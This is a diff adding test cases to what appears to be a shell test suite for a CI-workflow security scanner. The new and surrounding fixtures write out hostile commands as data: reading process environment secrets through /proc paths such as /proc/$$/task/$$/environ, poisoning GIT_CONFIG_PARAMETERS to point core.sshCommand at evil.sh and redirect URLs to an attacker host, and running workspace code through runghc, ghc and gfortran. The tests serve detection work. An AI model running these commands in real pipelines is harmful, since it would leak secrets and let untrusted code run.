@@ -87,6 +87,10 @@ t awk-mawk-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}mawk '{print 
 t environ-procroot 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}base64 /proc/self/root/proc/self/environ"
 t environ-dotdot 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat /proc/self/../self/environ"
 
+# --- procfs task threads (Codex P1: /proc/<pid>/task/<tid>/environ) ---
+t environ-task 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}base64 \"/proc/\$\$/task/\$\$/environ\""
+t environ-task-nested-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat /proc/1/task/2/task/3/environ"
+
 # --- git config parameters (Codex P1: GIT_CONFIG_PARAMETERS) ---
 t helper-git-config-parameters 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf -v GIT_CONFIG_PARAMETERS '%s' \"'core.sshCommand=./evil.sh' 'url.https://attacker/.insteadOf=https://github.com/'\"; git fetch origin"
 t helper-git-config-parameters-bare 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}GIT_CONFIG_PARAMETERS=x"
@@ -148,6 +152,10 @@ t loader-mycc-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}mycc --ver
 t loader-gfortran 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gfortran -B\"\${GITHUB_WORKSPACE}/evil-bin\" \"\${GITHUB_WORKSPACE}/evil.f90\""
 t loader-gfortran-versioned 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gfortran-13 --version"
 t loader-gfortran-cross 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}x86_64-linux-gnu-gfortran --version"
+# --- GHC loaders (Codex P1: runghc interprets workspace .hs) ---
+t loader-runghc 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}runghc \"\${GITHUB_WORKSPACE}/evil.hs\""
+t loader-runhaskell 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}runhaskell \"\${GITHUB_WORKSPACE}/evil.hs\""
+t loader-ghc 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ghc \"\${GITHUB_WORKSPACE}/evil.hs\" -o /tmp/evil"
 
 # --- escaped-quote comment (Codex P1: \" closes the quote) ---
 t helper-escaped-quote 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf \"%s\" \"x\\\"#y\" >/dev/null; bash \"\${GITHUB_WORKSPACE}/evil.sh\""
